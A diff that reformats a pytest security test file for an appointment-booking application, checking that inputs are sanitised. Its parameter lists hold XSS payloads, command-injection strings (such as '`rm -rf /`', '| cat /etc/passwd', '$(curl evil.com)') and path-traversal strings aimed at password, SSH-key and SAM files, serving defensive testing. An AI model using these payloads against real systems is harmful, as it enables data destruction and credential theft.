@@ -7,26 +7,30 @@ These tests verify:
 - Path traversal prevention
 - JSON injection prevention
 """
+
 from __future__ import annotations
 
 import pytest
 
-from database import Customer, Appointment
 from booking_handlers import handle_book_appointment
+from database import Appointment, Customer
 
 
 @pytest.mark.security
 class TestInputValidation:
     """Test input validation and sanitization."""
 
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "javascript:alert('XSS')",
-        "<svg/onload=alert('XSS')>",
-        "';alert(String.fromCharCode(88,83,83))//",
-        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-    ])
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<svg/onload=alert('XSS')>",
+            "';alert(String.fromCharCode(88,83,83))//",
+            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        ],
+    )
     def test_xss_customer_notes(self, db_session, xss_payload):
         """Test XSS prevention in customer notes."""
         customer = Customer(
@@ -43,11 +47,14 @@ class TestInputValidation:
         # Notes should be stored but escaped when rendered
         assert customer.notes is not None
 
-    @pytest.mark.parametrize("xss_payload", [
-        "<script>steal_data()</script>",
-        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
-        "<BODY ONLOAD=alert('XSS')>",
-    ])
+    @pytest.mark.parametrize(
+        "xss_payload",
+        [
+            "<script>steal_data()</script>",
+            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+            "<BODY ONLOAD=alert('XSS')>",
+        ],
+    )
     def test_xss_special_requests(self, db_session, customer, xss_payload):
         """Test XSS prevention in appointment special requests."""
         appointment = Appointment(
@@ -63,15 +70,20 @@ class TestInputValidation:
         # Should store but not execute
         assert appointment.special_requests is not None
 
-    @pytest.mark.parametrize("command_injection", [
-        "; ls -la",
-        "| cat /etc/passwd",
-        "& whoami",
-        "`rm -rf /`",
-        "$(curl evil.com)",
-        "&& ping -c 10 evil.com",
-    ])
-    def test_command_injection_service_type(self, db_session, customer, command_injection):
+    @pytest.mark.parametrize(
+        "command_injection",
+        [
+            "; ls -la",
+            "| cat /etc/passwd",
+            "& whoami",
+            "`rm -rf /`",
+            "$(curl evil.com)",
+            "&& ping -c 10 evil.com",
+        ],
+    )
+    def test_command_injection_service_type(
+        self, db_session, customer, command_injection
+    ):
         """Test command injection prevention in service type."""
         result = handle_book_appointment(
             db_session,
@@ -88,13 +100,16 @@ class TestInputValidation:
             assert ";" not in result.get("service_type", "")
             assert "|" not in result.get("service_type", "")
 
-    @pytest.mark.parametrize("path_traversal", [
-        "../../../etc/passwd",
-        "..\\..\\..\\windows\\system32",
-        "../../../../../../root/.ssh/id_rsa",
-        "/etc/passwd",
-        "C:\\Windows\\System32\\config\\SAM",
-    ])
+    @pytest.mark.parametrize(
+        "path_traversal",
+        [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32",
+            "../../../../../../root/.ssh/id_rsa",
+            "/etc/passwd",
+            "C:\\Windows\\System32\\config\\SAM",
+        ],
+    )
     def test_path_traversal_prevention(self, db_session, path_traversal):
         """Test path traversal prevention."""
         customer = Customer(
@@ -121,11 +136,14 @@ class TestInputValidation:
         # Should store as string, not parse
         assert isinstance(voice_conversation.custom_metadata, dict)
 
-    @pytest.mark.parametrize("phone", [
-        "+15551234567",
-        "555-123-4567",
-        "(555) 123-4567",
-    ])
+    @pytest.mark.parametrize(
+        "phone",
+        [
+            "+15551234567",
+            "555-123-4567",
+            "(555) 123-4567",
+        ],
+    )
     def test_phone_number_validation_pass(self, db_session, phone):
         """Test valid phone numbers are accepted."""
         result = handle_book_appointment(
@@ -140,11 +158,14 @@ class TestInputValidation:
         # Should accept valid formats
         assert result is not None
 
-    @pytest.mark.parametrize("email", [
-        "user@example.com",
-        "user+tag@example.com",
-        "user.name@sub.example.com",
-    ])
+    @pytest.mark.parametrize(
+        "email",
+        [
+            "user@example.com",
+            "user+tag@example.com",
+            "user.name@sub.example.com",
+        ],
+    )
     def test_email_validation_pass(self, db_session, email):
         """Test valid emails are accepted."""
         result = handle_book_appointment(
